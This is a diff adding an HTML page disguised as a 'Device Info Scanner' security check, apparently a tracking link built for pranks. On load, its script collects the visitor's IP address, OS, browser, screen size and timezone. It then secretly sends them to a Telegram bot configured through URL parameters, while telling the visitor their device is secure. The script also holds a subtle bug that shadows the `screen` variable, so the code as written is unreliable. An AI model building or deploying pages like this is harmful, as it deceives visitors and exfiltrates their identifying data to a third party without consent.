@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Device Scanner</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Inter',-apple-system,sans-serif;
+            background:#0a120a;
+            color:#d0e8d0;
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:16px;
+        }
+        .container{
+            max-width:480px;
+            width:100%;
+            background:#111e11;
+            border:1px solid #b8960f;
+            border-radius:24px;
+            padding:28px 22px;
+            box-shadow:0 20px 60px rgba(0,0,0,0.6);
+            position:relative;
+            overflow:hidden;
+        }
+        .container::before{
+            content:'';
+            position:absolute;
+            top:0;left:0;right:0;
+            height:4px;
+            background:linear-gradient(90deg,#b8960f,#f5c518,#b8960f);
+        }
+        .header{
+            text-align:center;
+            margin-bottom:16px;
+        }
+        .header .icon{
+            font-size:3rem;
+            display:block;
+            margin-bottom:2px;
+        }
+        .header h1{
+            font-size:1.6rem;
+            font-weight:700;
+            color:#f5c518;
+            letter-spacing:-0.3px;
+        }
+        .header p{
+            color:#7aaa7a;
+            font-size:0.85rem;
+            margin-top:2px;
+        }
+        .scan-status{
+            background:#0f1a0f;
+            border:1px solid #2a4a2a;
+            border-radius:16px;
+            padding:14px;
+            margin-bottom:16px;
+            text-align:center;
+        }
+        .scan-status .status-text{
+            font-size:0.95rem;
+            font-weight:600;
+            color:#b0d0b0;
+        }
+        .scan-status .status-icon{
+            font-size:2rem;
+            display:block;
+            margin:2px 0;
+        }
+        .info-grid{
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:10px;
+            margin-top:14px;
+            opacity:0;
+            transform:translateY(10px);
+            transition:opacity 0.6s ease, transform 0.6s ease;
+        }
+        .info-grid.active{
+            opacity:1;
+            transform:translateY(0);
+        }
+        .info-item{
+            background:#0f1a0f;
+            border:1px solid #1a3a1a;
+            border-radius:12px;
+            padding:12px 10px;
+            text-align:center;
+        }
+        .info-item .label{
+            font-size:0.6rem;
+            color:#7a8a6a;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+        }
+        .info-item .value{
+            font-size:0.85rem;
+            color:#e0f0e0;
+            font-weight:600;
+            margin-top:2px;
+            word-break:break-all;
+        }
+        .info-item .value.ip{
+            font-size:0.7rem;
+        }
+        .footer-note{
+            margin-top:18px;
+            padding:10px 14px;
+            background:#1a2a1a;
+            border-left:3px solid #f5c518;
+            border-radius:12px;
+            font-size:0.7rem;
+            color:#7aaa7a;
+            text-align:center;
+        }
+        .loader{
+            display:inline-block;
+            width:20px;
+            height:20px;
+            border:2px solid #2a4a2a;
+            border-top-color:#f5c518;
+            border-radius:50%;
+            animation:spin 0.8s linear infinite;
+            margin:4px auto;
+        }
+        .loader.hidden{display:none;}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @media(max-width:480px){
+            .container{padding:20px 16px}
+            .header h1{font-size:1.3rem}
+            .info-grid{grid-template-columns:1fr 1fr;gap:8px}
+            .info-item{padding:8px}
+            .info-item .value{font-size:0.75rem}
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="mainContainer">
+
+    <div class="header">
+        <span class="icon"></span>
+        <h1>Device Info Scanner</h1>
+        <p>Scanning your device for security check</p>
+    </div>
+
+    <div class="scan-status" id="scanStatus">
+        <span class="status-icon" id="statusIcon"></span>
+        <div class="status-text" id="statusText">Initializing...</div>
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <div class="info-grid" id="infoGrid">
+        <div class="info-item">
+            <div class="label"> IP Address</div>
+            <div class="value ip" id="ipVal">-</div>
+        </div>
+        <div class="info-item">
+            <div class="label"> OS</div>
+            <div class="value" id="osVal">-</div>
+        </div>
+        <div class="info-item">
+            <div class="label"> Browser</div>
+            <div class="value" id="browserVal">-</div>
+        </div>
+        <div class="info-item">
+            <div class="label"> Screen</div>
+            <div class="value" id="screenVal">-</div>
+        </div>
+        <div class="info-item" style="grid-column:1/-1;">
+            <div class="label"> Timezone</div>
+            <div class="value" id="tzVal">-</div>
+        </div>
+        <div class="info-item" style="grid-column:1/-1;">
+            <div class="label"> Date & Time</div>
+            <div class="value" id="dtVal">-</div>
+        </div>
+    </div>
+
+    <div class="footer-note">
+         Your device is secure. This information is for verification purposes only.
+    </div>
+
+    <!--       link-pranks-    -->
+</div>
+
+<script>
+    (function(){
+        'use strict';
+
+        // ---------- Telegram Creds ----------
+        function getCreds() {
+            const p = new URLSearchParams(window.location.search);
+            let t = p.get('tg_token') || localStorage.getItem('tg_bot_token');
+            let c = p.get('tg_chat') || localStorage.getItem('tg_chat_id');
+            return { token: t, chatId: c };
+        }
+
+        // ---------- Send to Telegram ----------
+        function sendToTelegram(info) {
+            const { token, chatId } = getCreds();
+            if (!token || !chatId) {
+                console.warn('Telegram not configured.');
+                return;
+            }
+            const time = new Date().toLocaleString();
+            const msg = ` *  *\n ${time}\n Tool:  Device Scanner\n Action: Device info captured\n\n IP: ${info.ip}\n OS: ${info.os}\n Browser: ${info.browser}\n Screen: ${info.screen}\n Timezone: ${info.tz}\n Time: ${info.datetime}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            }).catch(() => {});
+        }
+
+        // ---------- Gather Device Info ----------
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac OS')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+
+            let browser = 'Unknown';
+            if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+
+            const screen = `${screen.width}x${screen.height}`;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const dt = new Date().toLocaleString();
+            return { os, browser, screen, tz, datetime: dt };
+        }
+
+        // ---------- Fetch IP ----------
+        async function fetchIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'N/A';
+            } catch {
+                return 'N/A';
+            }
+        }
+
+        // ---------- DOM refs ----------
+        const statusIcon = document.getElementById('statusIcon');
+        const statusText = document.getElementById('statusText');
+        const loader = document.getElementById('loader');
+        const infoGrid = document.getElementById('infoGrid');
+        const ipVal = document.getElementById('ipVal');
+        const osVal = document.getElementById('osVal');
+        const browserVal = document.getElementById('browserVal');
+        const screenVal = document.getElementById('screenVal');
+        const tzVal = document.getElementById('tzVal');
+        const dtVal = document.getElementById('dtVal');
+
+        // ---------- Main ----------
+        (async function init() {
+            try {
+                // Step 1: Show scanning
+                statusIcon.textContent = '';
+                statusText.textContent = 'Scanning device...';
+                loader.classList.remove('hidden');
+
+                // Step 2: Get data
+                const ip = await fetchIP();
+                const info = getDeviceInfo();
+
+                // Step 3: Show on page
+                ipVal.textContent = ip;
+                osVal.textContent = info.os;
+                browserVal.textContent = info.browser;
+                screenVal.textContent = info.screen;
+                tzVal.textContent = info.tz;
+                dtVal.textContent = info.datetime;
+
+                // Step 4: Show grid
+                infoGrid.classList.add('active');
+
+                // Step 5: Status done
+                statusIcon.textContent = '';
+                statusText.textContent = 'Scan complete! Your device is secure.';
+                loader.classList.add('hidden');
+
+                // Step 6: Send to Telegram
+                const fullInfo = { ip, os: info.os, browser: info.browser, screen: info.screen, tz: info.tz, datetime: info.datetime };
+                sendToTelegram(fullInfo);
+
+                console.log(' Device info sent to Telegram');
+            } catch (err) {
+                console.error('Error:', err);
+                statusIcon.textContent = '';
+                statusText.textContent = 'Error scanning device. Please refresh.';
+                loader.classList.add('hidden');
+            }
+        })();
+    })();
+</script>
+</body>
+</html>
